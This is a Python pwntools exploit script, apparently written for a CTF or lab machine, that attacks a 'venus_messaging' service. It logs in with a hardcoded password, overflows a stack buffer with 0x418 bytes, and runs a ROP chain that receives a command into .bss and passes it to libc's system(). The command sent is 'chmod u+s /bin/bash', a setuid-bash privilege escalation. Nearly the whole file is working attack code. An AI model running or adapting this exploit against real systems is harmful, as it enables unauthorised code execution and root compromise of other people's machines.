#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./venus_messaging')

if args.REMOTE:
	#p = remote('172.19.2.239',9080)
	#port blocked? workaround: ssh -L 9080:localhost:9080 magellan@172.19.2.239
	p = remote('localhost',9080)
	libc = ELF('./libc.so.6')
	# lame no ASLR
	'''
	# ldd /usr/bin/venus_messaging
	linux-vdso.so.1 (0x00007ffff7fc9000)
	libc.so.6 => /lib64/libc.so.6 (0x00007ffff7dee000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
	'''
	libc.address = 0x00007ffff7dee000
else:
	p = remote('localhost',9080)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	libc.address = 0x00007ffff7dc0000

fd = 0x4
command = b'chmod u+s /bin/bash'

pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi = next(libc.search(asm('pop rsi; ret')))
pop_rdx_rcx_rbx = next(libc.search(asm('pop rdx; pop rcx; pop rbx; ret')))

payload  = b''
payload += 0x418 * b'A'
payload += p64(pop_rdi)
payload += p64(fd)
payload += p64(pop_rsi)
payload += p64(binary.bss())
payload += p64(pop_rdx_rcx_rbx)
payload += p64(len(command))
payload += p64(0)
payload += p64(0)
payload += p64(binary.plt.recv)
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(libc.sym.system)

p.sendlineafter(b'password:', b'loveandbeauty')
p.sendlineafter(b'processed:\n',payload)
sleep(0.1)
p.send(command)
p.stream()
